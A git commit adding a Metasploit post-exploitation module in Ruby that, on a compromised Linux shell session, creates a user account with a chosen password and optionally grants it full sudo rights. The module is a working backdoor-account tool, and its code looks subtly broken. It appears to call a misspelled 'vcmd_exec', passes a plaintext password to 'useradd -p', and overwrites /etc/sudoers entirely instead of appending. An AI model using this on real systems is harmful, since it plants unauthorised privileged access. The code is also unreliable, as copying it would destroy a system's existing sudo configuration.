08e6afd8074a145fc79a1c8ae19948cce609f7d8
Joshua Abraham <jabra@spl0it.org>
2013-03-14 17:11:47 -0400

    linux post module to add a user to the system

---
+++ modules/post/linux/manage/add_user.rb
@@ -0,0 +1,55 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
+require 'msf/core'
+require 'rex'
+require 'msf/core/post/common'
+require 'msf/core/post/file'
+require 'msf/core/post/linux/system'
+require 'msf/core/post/linux/priv'
+
+class Metasploit3 < Msf::Post
+
+	include Msf::Post::Common
+	include Msf::Post::File
+	include Msf::Post::Linux::System
+
+
+	def initialize(info={})
+		super( update_info( info,
+				'Name'          => 'Linux Add User',
+				'Description'   => %q{
+					This module adds a user to the system.
+				},
+				'License'       => MSF_LICENSE,
+				'Author'        =>
+					[
+						'Joshua D. Abraham <jabra[at]praetorian.com>',
+					],
+				'Platform'      => [ 'linux' ],
+				'SessionTypes'  => [ 'shell' ]
+			))
+			register_options(
+			[
+				OptString.new('USER', [true, 'User to add.']),
+				OptString.new('PASS', [true, 'Password of the user.']),
+				OptBool.new('SUDO', [true, 'Give user sudo privs.',true]),
+			], self.class)
+
+	end
+
+	def run
+		vcmd_exec("useradd #{datastore['USER']} -p #{datastore['PASS']} ")
+
+		#
+		# NOTE: We are intensionally  not creating a homedir for the user
+		#
+		if datastore['SUDO'] == true
+			vcmd_exec("echo '#{datastore['USER']}	ALL=(ALL) ALL' > /etc/sudoers ")
+		end
+	end
+end
